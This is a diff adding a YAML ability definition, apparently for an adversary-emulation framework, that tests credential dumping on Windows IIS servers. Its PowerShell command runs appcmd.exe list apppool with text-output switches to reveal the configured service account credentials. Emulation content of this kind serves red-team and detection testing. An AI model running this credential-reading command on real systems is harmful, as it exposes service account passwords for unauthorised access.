@@ -1,0 +1,24 @@
+---
+- id: f6c693da77b8824b3c52ba3b6ca0bf88
+  name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)
+  description: 'AppCmd.exe is a command line utility which is used for managing an
+    IIS web server. The list command within the tool reveals the service account credentials
+    configured for the webserver. An adversary may use these credentials for other
+    malicious purposes.
+
+    [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*; C:\Windows\System32\inetsrv\appcmd.exe
+          list apppool /@text:*; C:\Windows\System32\inetsrv\appcmd.exe list apppool
+          /text:*
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
